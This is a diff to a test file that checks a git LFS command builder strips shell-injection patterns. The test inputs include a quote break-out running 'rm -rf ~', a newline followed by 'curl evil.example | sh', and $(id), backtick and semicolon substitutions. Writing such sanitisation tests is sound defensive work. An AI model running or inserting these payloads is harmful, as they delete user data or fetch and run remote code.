@@ -40,4 +40,19 @@ describe("lfsCommands", () => {
   it("skips track line when no patterns", () => {
     expect(lfsCommands([])).toBe("git lfs install");
   });
+
+  it("drops patterns that would break out of the shell line", () => {
+    // The block is meant to be pasted into a shell, so a stored pattern that is
+    // not a plain glob must never reach it.
+    const commands = lfsCommands([
+      "*.mp4",
+      'x"; rm -rf ~ #',
+      "a\ncurl evil.example | sh",
+      "b$(id).zip",
+      "c`id`.zip",
+      "d;id",
+    ]);
+    expect(commands).toBe('git lfs install\ngit lfs track "*.mp4"');
+    expect(lfsCommands(['x"; rm -rf ~ #'])).toBe("git lfs install");
+  });
 });
